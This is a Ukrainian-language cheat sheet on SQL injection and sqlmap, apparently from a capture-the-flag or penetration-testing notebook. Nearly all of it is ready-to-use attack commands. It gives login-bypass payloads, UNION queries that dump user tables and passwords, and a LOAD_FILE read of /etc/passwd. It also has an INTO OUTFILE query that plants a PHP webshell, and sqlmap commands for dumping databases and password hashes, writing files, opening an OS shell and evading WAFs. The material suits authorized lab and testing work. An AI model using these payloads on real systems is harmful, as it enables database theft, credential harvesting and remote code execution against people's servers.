# Cheatsheet: SQL Injection / sqlmap

Обхід логіну, дамп даних (креди/прапорці), читання файлів, інколи RCE. ← [web-enum](../02-workflows/web-enum.md) · [web-vulns](../04-techniques/web-vulns-overview.md)

## Ручна перевірка (швидко)
```
'            → помилка SQL? → ймовірно вразливо
' OR '1'='1
' OR 1=1-- -
admin'-- -            → обхід логіну (будь-який пароль)
" OR 1=1-- -          → якщо лапки подвійні
')  OR ('1'='1        → якщо параметр у дужках
```

## Визначити вручну (тип і колонки)
```
?id=1'                      → помилка
?id=1 AND 1=1 / AND 1=2     → різні сторінки → boolean-based
?id=1' ORDER BY 5-- -       → скільки колонок (поки не впаде)
?id=-1' UNION SELECT 1,2,3-- -            → які колонки видимі
?id=-1' UNION SELECT 1,@@version,database()-- -
?id=-1' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -
?id=-1' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users-- -
```

## Читання/запис файлів вручну (MySQL)
```
?id=-1' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -        # читати файл
?id=-1' UNION SELECT 1,'<?php system($_GET[c]);?>',3 INTO OUTFILE '/var/www/html/s.php'-- -  # webshell
```
Потрібні права FILE та `secure_file_priv`. Далі: `s.php?c=id` → [webshells](webshells-revshells.md).

## sqlmap — авто
```bash
sqlmap -u "http://$TARGET/page?id=1" --batch --dbs          # GET, перелік баз
sqlmap -u "http://$TARGET/login" --data='user=a&pass=b' --batch   # POST
sqlmap -u "http://$TARGET/x?id=1" --cookie='PHPSESSID=...' --batch # з сесією
sqlmap -r req.txt --batch                                   # з Burp-request (найзручніше)
sqlmap -r req.txt --batch -p id                             # тестувати конкретний параметр
```
Поглиблення:
```bash
sqlmap -r req.txt --batch -D <db> --tables                  # таблиці
sqlmap -r req.txt --batch -D <db> -T users --dump           # дамп таблиці
sqlmap -r req.txt --batch --dump-all --exclude-sysdbs       # усе, крім системних
sqlmap -r req.txt --batch --passwords                       # хеші юзерів БД
```
Читання/запис файлів і RCE:
```bash
sqlmap -r req.txt --batch --file-read=/etc/passwd           # прочитати файл
sqlmap -r req.txt --batch --file-write=shell.php --file-dest=/var/www/html/s.php
sqlmap -r req.txt --batch --os-shell                        # спробувати інтерактивний RCE
sqlmap -r req.txt --batch --sql-shell                       # інтерактивний SQL
```

## Корисні опції
| Опція | Значення |
|---|---|
| `--batch` | без питань (дефолти) |
| `--level 3 --risk 2` | глибше, якщо не бачить інʼєкції |
| `--technique=BEUSTQ` | типи (Boolean/Error/Union/Stacked/Time/inline) |
| `--dbms=mysql` | підказати СУБД (швидше) |
| `--tamper=space2comment,between` | обхід WAF/фільтрів |
| `--random-agent` | змінити User-Agent |
| `--threads 5` | швидше (не агресивно на платформу) |
| `--second-url=<url>` | second-order: інʼєкція спливає на іншій сторінці |
| `--dump --where="id=1"` | частковий дамп |

## Що дивитись / куди далі
- Таблиці `users/admin/accounts/config/flags/notes` — креди й прапорці.
- Хеші → спершу шукати plaintext поруч; крек лише якщо швидко ([credentials-reuse](../04-techniques/credentials-reuse.md)).
- Знайдені креди → перевірити на [інших сервісах](../02-workflows/credential-hunting.md) (SSH/SMB/панель).
- `--batch` без агресії на платформу (правила: без флуду/брутфорсу платформи).
